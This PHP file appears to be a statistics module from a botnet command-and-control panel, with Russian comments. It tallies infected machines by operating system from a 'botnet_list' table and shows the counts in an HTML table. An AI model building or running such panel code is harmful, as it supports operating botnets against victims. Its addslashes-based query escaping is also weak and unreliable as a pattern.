<?php if(!defined('__CP__'))die();

define('OSLIST_WIDTH', 500); //Ширина колонки
define('STAT_WIDTH',  '1%'); //Ширина колонки статистики.

//Текущий ботнет.
define('CURRENT_BOTNET', (!empty($_GET['botnet']) ? $_GET['botnet'] : ''));

///////////////////////////////////////////////////////////////////////////////
// Вывод общей информации.
///////////////////////////////////////////////////////////////////////////////

//Получем список OC.
$oslist = '';
$query = ((CURRENT_BOTNET == '') ? '' : 'WHERE botnet=\''.addslashes(CURRENT_BOTNET).'\' ');
if(($r = @mysql_query("SELECT os_version, COUNT(os_version) FROM botnet_list {$query}GROUP BY os_version")) && mysql_affected_rows() > 0)
{
  $list = array();
  while(($mt = @mysql_fetch_row($r)))@$list[OSDataToString($mt[0])] += $mt[1];
  arsort($list);
  
  $i = 0;
  foreach($list as $name => $count)
  {
    $oslist .=
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto',     htmlentities_ex($name)),       $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, number_format_as_int($count)), $i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1).
    THEME_LIST_ROW_END;
    $i++;
  }
}
//Ошибка.
else
{
  $oslist .=
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, $r ? LNG_STATS_OSLIST_EMPTY : mysql_error_ex()), THEME_LIST_ITEM_EMPTY_1).
  THEME_LIST_ROW_END;
}

ThemeBegin(LNG_STATS, 0, 0, 0);
echo
str_replace('{WIDTH}', OSLIST_WIDTH.'px', THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_TOTAL_INFO.'&#160;'.BotnetsToListBox(CURRENT_BOTNET, '')), THEME_DIALOG_TITLE).
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
        str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
          $oslist.
        THEME_LIST_END.
      THEME_DIALOG_ITEM_CHILD_END.
    THEME_DIALOG_ROW_END.
  THEME_DIALOG_END;
ThemeEnd();
?>